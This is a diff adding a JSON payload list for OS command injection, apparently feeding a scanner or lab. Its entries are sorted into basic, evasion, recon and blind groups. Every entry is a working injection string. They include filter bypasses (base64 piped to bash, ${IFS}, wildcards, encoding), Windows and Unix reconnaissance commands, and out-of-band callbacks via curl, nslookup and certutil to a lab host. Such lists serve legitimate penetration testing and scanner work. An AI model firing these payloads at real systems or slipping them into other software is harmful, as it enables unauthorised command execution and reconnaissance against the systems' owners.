@@ -1,0 +1,45 @@
+{
+  "basic": [
+    { "id": 1, "payload": "; whoami",           "desc": "Basic semicolon injection",      "severity": "High"     },
+    { "id": 2, "payload": "& whoami",            "desc": "Ampersand injection",            "severity": "High"     },
+    { "id": 3, "payload": "| whoami",            "desc": "Pipe injection",                 "severity": "High"     },
+    { "id": 4, "payload": "&& whoami",           "desc": "AND operator injection",         "severity": "High"     },
+    { "id": 5, "payload": "|| whoami",           "desc": "OR operator injection",          "severity": "High"     },
+    { "id": 6, "payload": "`whoami`",            "desc": "Backtick substitution",          "severity": "High"     },
+    { "id": 7, "payload": "$(whoami)",           "desc": "Dollar paren substitution",      "severity": "High"     },
+    { "id": 8, "payload": "; id",                "desc": "Get user ID",                    "severity": "High"     },
+    { "id": 9, "payload": "; hostname",          "desc": "Get hostname",                   "severity": "Medium"   },
+    { "id": 10,"payload": "; ipconfig",          "desc": "Get network info (Windows)",     "severity": "Medium"   }
+  ],
+  "evasion": [
+    { "id": 11,"payload": "%0awhoami",           "desc": "Newline bypass",                 "severity": "Critical" },
+    { "id": 12,"payload": "${IFS}whoami",        "desc": "IFS variable bypass",            "severity": "Critical" },
+    { "id": 13,"payload": ";w'h'o'a'm'i",       "desc": "Quote string concat",            "severity": "Critical" },
+    { "id": 14,"payload": "%3Bwhoami",           "desc": "URL encoded semicolon",          "severity": "High"     },
+    { "id": 15,"payload": "%253Bwhoami",         "desc": "Double URL encoded",             "severity": "High"     },
+    { "id": 16,"payload": ";/???/??oami",        "desc": "Wildcard bypass",                "severity": "Critical" },
+    { "id": 17,"payload": ";a=who;b=ami;$a$b",  "desc": "Variable expansion",             "severity": "Critical" },
+    { "id": 18,"payload": ";echo d2hvYW1p|base64 -d|bash", "desc": "Base64 bypass",       "severity": "Critical" },
+    { "id": 19,"payload": ";&& whoami",          "desc": "Combined operators",             "severity": "High"     },
+    { "id": 20,"payload": ";w*oami",             "desc": "Wildcard in command",            "severity": "High"     }
+  ],
+  "recon": [
+    { "id": 21,"payload": "; whoami",            "desc": "Current user",                   "severity": "High"     },
+    { "id": 22,"payload": "; hostname",          "desc": "Machine hostname",               "severity": "Medium"   },
+    { "id": 23,"payload": "; ipconfig /all",     "desc": "Full network config (Windows)",  "severity": "High"     },
+    { "id": 24,"payload": "; systeminfo",        "desc": "System information (Windows)",   "severity": "High"     },
+    { "id": 25,"payload": "; net user",          "desc": "List users (Windows)",           "severity": "Critical" },
+    { "id": 26,"payload": "; dir C:\\",          "desc": "List C drive (Windows)",         "severity": "High"     },
+    { "id": 27,"payload": "; type C:\\Windows\\System32\\drivers\\etc\\hosts", "desc": "Read hosts file", "severity": "Critical" },
+    { "id": 28,"payload": "; echo %USERNAME%",   "desc": "Windows username variable",      "severity": "Medium"   },
+    { "id": 29,"payload": "; echo %COMPUTERNAME%","desc": "Windows computer name",         "severity": "Medium"   },
+    { "id": 30,"payload": "; tasklist",          "desc": "Running processes (Windows)",    "severity": "High"     }
+  ],
+  "blind": [
+    { "id": 31,"payload": "; ping -n 5 127.0.0.1", "desc": "Time delay (Windows)",        "severity": "High"     },
+    { "id": 32,"payload": "; curl http://oob.lab/", "desc": "OOB HTTP callback",           "severity": "Critical" },
+    { "id": 33,"payload": "; nslookup oob.lab",  "desc": "OOB DNS lookup",                 "severity": "Critical" },
+    { "id": 34,"payload": "; powershell -c \"Start-Sleep 5\"", "desc": "PowerShell delay", "severity": "High"     },
+    { "id": 35,"payload": "; certutil -urlcache -split -f http://oob.lab/test.txt", "desc": "Windows OOB fetch", "severity": "Critical" }
+  ]
+}
